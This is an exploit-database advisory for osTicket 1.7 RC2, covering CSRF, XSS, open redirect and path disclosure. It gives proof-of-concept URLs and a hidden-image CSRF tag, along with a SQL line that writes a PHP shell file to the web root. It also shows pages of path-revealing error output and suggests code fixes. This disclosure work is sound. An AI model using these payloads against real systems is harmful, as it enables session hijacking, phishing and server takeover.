@@ -1,0 +1,908 @@
+id: 20099
+date: 01/06/2013
+title: osTicket 1.7 RC2 CSRF / Disclosure / XSS / Redirect Vulnerabilities
+author: AkaStep
+cves: 
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : 1337day.com                                   0
+1  [+] Support e-mail  : submit[at]1337day.com                         1
+0                                                                      0
+1               #########################################              1
+0               I'm AkaStep member from Inj3ct0r Team                  1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+=================================================
+Vulnerable Software: OsTicket-osTicket-1.7-1.7-RC2-3-gafe7853
+Official Site:http://www.osticket.com
+Tested Version: OsTicket-osTicket-1.7-1.7-RC2-3-gafe7853
+Vulns: CSRF +PATH DISCLOSURE+XSS+Open Redirect
+=================================================
+
+=================================================
+Tested on:
+*php.ini MAGIC_QUOTES_GPC OFF*
+Safe mode off
+/*
+OS: Windows XP SP2 (32 bit)
+Apache: 2.2.21.0
+PHP Version: 5.2.17.17
+MYSQL:  5.5.24
+*/
+=================================================
+
+
+
+
+
+/scp/logout.php
+Handles CSRF tokens incorrectly.
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/scp/logout.php
+
+Will destroy session.(This issuse can be used in ex: using CSRF to force admin to logout)
+
+In ex:
+<img src="http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/scp/logout.php" heigth="0" width="0" />
+
+
+Incorrect code:
+//scp/logout.php
+=========================================================
+
+<?php
+/*********************************************************************
+    logout.php
+
+    Log out staff
+    Destroy the session and redirect to login.php
+
+    Peter Rotich <peter@osticket.com>
+    Copyright (c)  2006-2012 osTicket
+    http://www.osticket.com
+
+    Released under the GNU General Public License WITHOUT ANY WARRANTY.
+    See LICENSE.TXT for details.
+
+    vim: expandtab sw=4 ts=4 sts=4:
+**********************************************************************/
+require('staff.inc.php');
+//CSRF Check: Make sure the user actually clicked on the link to logout.
+if(!$_GET['auth'] || $_GET['auth']!=md5($ost->getCSRFToken().SECRET_SALT.session_id()))
+   @header('Location: index.php');
+
+$ost->logDebug('Staff logout',
+        sprintf("%s logged out [%s]",
+            $thisstaff->getUserName(), $_SERVER['REMOTE_ADDR'])); //Debug.
+$_SESSION['_staff']=array();
+session_unset();
+session_destroy();
+@header('Location: login.php');
+require('login.php');
+?>
+
+=========================================================
+
+
+
+
+
+Correct way:(below)
+
+
+====================================================================
+<?php
+/*********************************************************************
+    logout.php
+
+    Log out staff
+    Destroy the session and redirect to login.php
+
+    Peter Rotich <peter@osticket.com>
+    Copyright (c)  2006-2012 osTicket
+    http://www.osticket.com
+
+    Released under the GNU General Public License WITHOUT ANY WARRANTY.
+    See LICENSE.TXT for details.
+
+    vim: expandtab sw=4 ts=4 sts=4:
+**********************************************************************/
+require('staff.inc.php');
+//CSRF Check: Make sure the user actually clicked on the link to logout.
+if(!isset($_GET['auth']) || $_GET['auth']!=md5($ost->getCSRFToken().SECRET_SALT.session_id()))
+{
+   @header('Location: index.php');
+exit;
+}
+
+$ost->logDebug('Staff logout',
+        sprintf("%s logged out [%s]",
+            $thisstaff->getUserName(), $_SERVER['REMOTE_ADDR'])); //Debug.
+$_SESSION['_staff']=array();
+session_unset();
+session_destroy();
+@header('Location: login.php');
+require('login.php');
+?>
+
+
+
+
+
+====================================================================
+
+
+
+
+
+No anticsrf tokens for users?
+
+/logout.php
+
+require('client.inc.php');
+//We are checking to make sure the user is logged in before a logout to avoid session reset tricks on excess logins
+$_SESSION['_client']=array();
+session_unset();
+session_destroy();
+header('Location: index.php');
+require('index.php');
+?>
+
+
+
+
+====================================================================
+
+
+
+
+
+
+Open Redirect && XSS vulnerability:
+*Still unfixed in this version too*:(/l.php and /scp/l.php)
+
+
+
+==========SNIP==========
+global $_GET;
+$url = $_GET['url'];
+if (!$url) exit();?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta http-equiv="refresh" content="0;<?php echo $url; ?>"/>
+=======END SNIP==========
+
+
+
+Exploitation:
+XSS:
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/scp/l.php?url=11a"/><script>alert("BoOm!");</script>
+
+
+
+XSS Still unfixed:
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/scp/directory.php?q=100%22+onmouseover%3D%22alert%281%29%22&did=0&submit=Filter
+
+
+
+
+
+Open Redirect:
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/scp/l.php?url=http://SOME_PHISH_SITE_MAY_GO_HERE.tld
+(Can be used against admin)
+
+
+
+
+Still unfixed:
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=%22%20onmouseover=%22alert%281%29%22
+
+
+
+
+
+
+
+Path disclosure: (Requires administrative login to system.)
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/scp/tickets.php?sort[]=subj&order=id
+
+
+Warning: Illegal offset type in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\tickets.inc.php on line 194
+
+Warning: urlencode() expects parameter 1 to be string, array given in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\tickets.inc.php on line 237
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/scp/directory.php?&order=DESC&sort[]=mobile
+
+Warning: urlencode() expects parameter 1 to be string, array given in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\directory.inc.php on line 57
+
+
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/scp/directory.php?&order=DESC&sort[]=dept
+
+Warning: urlencode() expects parameter 1 to be string, array given in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\directory.inc.php on line 57
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/scp/directory.php?&order[]=DESC&sort=dept
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/scp/directory.php?q[]=&did=1&submit=Filter
+Warning: mysql_real_escape_string() expects parameter 1 to be string, array given in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\mysql.php on line 178
+
+
+
+
+
+
+
+
+===========================PATH DISCLOSURES=========================
+Needs .htaccess (Deny from all)
+
+This type information is usefull when dealing with sql injection (if mysql user have FILE_PRIV=Y)
+(Especially for:
+select "<?php `ls -tlas`;?>" into outfile '_EXPOSED_PATH_ON_DOCROOT/sh.php'
+)
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/api/api.inc.php
+
+
+
+<br />
+<b>Warning</b>:  mail() [<a href='function.mail'>function.mail</a>]: SMTP server response: 530 SMTP authentication is required. in <b>C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Mail\mail.php</b> on line <b>128</b><br />
+77
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/api/cron.php
+
+<br />
+<b>Warning</b>:  mail() [<a href='function.mail'>function.mail</a>]: SMTP server response: 530 SMTP authentication is required. in <b>C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Mail\mail.php</b> on line <b>128</b><br />
+77
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/api/pipe.php
+
+
+
+#!/usr/bin/php -q
+<br />
+<b>Warning</b>:  mail() [<a href='function.mail'>function.mail</a>]: SMTP server response: 530 SMTP authentication is required. in <b>C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Mail\mail.php</b> on line <b>128</b><br />
+77
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/captcha.php
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/attachment.php
+Warning: mail() [function.mail]: SMTP server response: 530 SMTP authentication is required. in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Mail\mail.php on line 128
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/api/urls.conf.php
+
+
+Fatal error: Call to undefined function patterns() in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\api\urls.conf.php on line 7
+
+
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/api.ticket.php
+
+
+Warning: include_once(include/class.api.php) [function.include-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\api.ticket.php on line 3
+
+Warning: include_once() [function.include]: Failed opening 'include/class.api.php' for inclusion (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\api.ticket.php on line 3
+
+Warning: include_once(include/class.ticket.php) [function.include-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\api.ticket.php on line 4
+
+Warning: include_once() [function.include]: Failed opening 'include/class.ticket.php' for inclusion (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\api.ticket.php on line 4
+
+Fatal error: Class 'ApiController' not found in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\api.ticket.php on line 6
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.ajax.php
+
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.ajax.php on line 18
+
+Warning: require_once(INCLUDE_DIRclass.api.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.ajax.php on line 18
+
+Fatal error: require_once() [function.require]: Failed opening required 'INCLUDE_DIRclass.api.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.ajax.php on line 18
+
+
+
+
+192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.attachment.php
+
+
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.attachment.php on line 16
+
+Warning: require_once(INCLUDE_DIRclass.ticket.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.attachment.php on line 16
+
+Fatal error: require_once() [function.require]: Failed opening required 'INCLUDE_DIRclass.ticket.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.attachment.php on line 16
+
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.canned.php
+
+
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.canned.php on line 16
+
+Warning: include_once(INCLUDE_DIRclass.file.php) [function.include-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.canned.php on line 16
+
+Warning: include_once() [function.include]: Failed opening 'INCLUDE_DIRclass.file.php' for inclusion (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.canned.php on line 16
+
+
+
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.config.php
+
+
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.config.php on line 17
+
+Warning: require_once(INCLUDE_DIRclass.email.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.config.php on line 17
+
+Fatal error: require_once() [function.require]: Failed opening required 'INCLUDE_DIRclass.email.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.config.php on line 17
+
+
+
+
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.email.php
+
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.email.php on line 15
+
+Warning: include_once(INCLUDE_DIRclass.dept.php) [function.include-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.email.php on line 15
+
+Warning: include_once() [function.include]: Failed opening 'INCLUDE_DIRclass.dept.php' for inclusion (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.email.php on line 15
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.email.php on line 16
+
+Warning: include_once(INCLUDE_DIRclass.mailfetch.php) [function.include-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.email.php on line 16
+
+Warning: include_once() [function.include]: Failed opening 'INCLUDE_DIRclass.mailfetch.php' for inclusion (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.email.php on line 16
+
+
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.mailer.php
+
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.mailer.php on line 19
+
+Warning: include_once(INCLUDE_DIRclass.email.php) [function.include-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.mailer.php on line 19
+
+Warning: include_once() [function.include]: Failed opening 'INCLUDE_DIRclass.email.php' for inclusion (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.mailer.php on line 19
+
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.mailfetch.php
+
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.mailfetch.php on line 17
+
+Warning: require_once(INCLUDE_DIRclass.mailparse.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.mailfetch.php on line 17
+
+Fatal error: require_once() [function.require]: Failed opening required 'INCLUDE_DIRclass.mailparse.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.mailfetch.php on line 17
+
+
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.mailparse.php
+
+
+
+Warning: require_once(Mail/mimeDecode.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.mailparse.php on line 18
+
+Fatal error: require_once() [function.require]: Failed opening required 'Mail/mimeDecode.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.mailparse.php on line 18
+
+
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.migrater.php
+
+
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.migrater.php on line 94
+
+Warning: include_once(INCLUDE_DIRclass.file.php) [function.include-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.migrater.php on line 94
+
+Warning: include_once() [function.include]: Failed opening 'INCLUDE_DIRclass.file.php' for inclusion (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.migrater.php on line 94
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.osticket.php
+
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.osticket.php on line 21
+
+Warning: require_once(INCLUDE_DIRclass.config.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.osticket.php on line 21
+
+Fatal error: require_once() [function.require]: Failed opening required 'INCLUDE_DIRclass.config.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.osticket.php on line 21
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.passwd.php
+
+
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.passwd.php on line 17
+
+Warning: require_once(INCLUDE_DIRPasswordHash.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.passwd.php on line 17
+
+Fatal error: require_once() [function.require]: Failed opening required 'INCLUDE_DIRPasswordHash.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.passwd.php on line 17
+
+
+
+
+
+A lot of warnings:
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.staff.php
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.ticket.php
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.upgrader.php
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.upgrader.php on line 17
+
+Warning: require_once(INCLUDE_DIRclass.setup.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.upgrader.php on line 17
+
+Fatal error: require_once() [function.require]: Failed opening required 'INCLUDE_DIRclass.setup.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.upgrader.php on line 17
+
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/class.usersession.php
+
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.usersession.php on line 17
+
+Warning: include_once(INCLUDE_DIRclass.client.php) [function.include-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.usersession.php on line 17
+
+Warning: include_once() [function.include]: Failed opening 'INCLUDE_DIRclass.client.php' for inclusion (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.usersession.php on line 17
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.usersession.php on line 18
+
+Warning: include_once(INCLUDE_DIRclass.staff.php) [function.include-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.usersession.php on line 18
+
+Warning: include_once() [function.include]: Failed opening 'INCLUDE_DIRclass.staff.php' for inclusion (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.usersession.php on line 18
+
+Fatal error: Class 'Client' not found in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\class.usersession.php on line 106
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/client/header.inc.php
+
+
+
+Notice: Undefined variable: cfg in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\client\header.inc.php on line 2
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Auth/SASL/Anonymous.php
+
+
+Warning: require_once(Auth/SASL/Common.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Auth\SASL\Anonymous.php on line 46
+
+Fatal error: require_once() [function.require]: Failed opening required 'Auth/SASL/Common.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Auth\SASL\Anonymous.php on line 46
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Auth/SASL/CramMD5.php
+
+
+Warning: require_once(Auth/SASL/Common.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Auth\SASL\CramMD5.php on line 46
+
+Fatal error: require_once() [function.require]: Failed opening required 'Auth/SASL/Common.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Auth\SASL\CramMD5.php on line 46
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Auth/SASL/DigestMD5.php
+
+
+Warning: require_once(Auth/SASL/Common.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Auth\SASL\DigestMD5.php on line 46
+
+Fatal error: require_once() [function.require]: Failed opening required 'Auth/SASL/Common.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Auth\SASL\DigestMD5.php on line 46
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Auth/SASL/Login.php
+
+
+Warning: require_once(Auth/SASL/Common.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Auth\SASL\Login.php on line 49
+
+Fatal error: require_once() [function.require]: Failed opening required 'Auth/SASL/Common.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Auth\SASL\Login.php on line 49
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Auth/SASL/Plain.php
+
+
+Warning: require_once(Auth/SASL/Common.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Auth\SASL\Plain.php on line 46
+
+Fatal error: require_once() [function.require]: Failed opening required 'Auth/SASL/Common.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Auth\SASL\Plain.php on line 46
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Auth/SASL.php
+
+Warning: require_once(PEAR.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Auth\SASL.php on line 46
+
+Fatal error: require_once() [function.require]: Failed opening required 'PEAR.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Auth\SASL.php on line 46
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Mail/mail.php
+
+
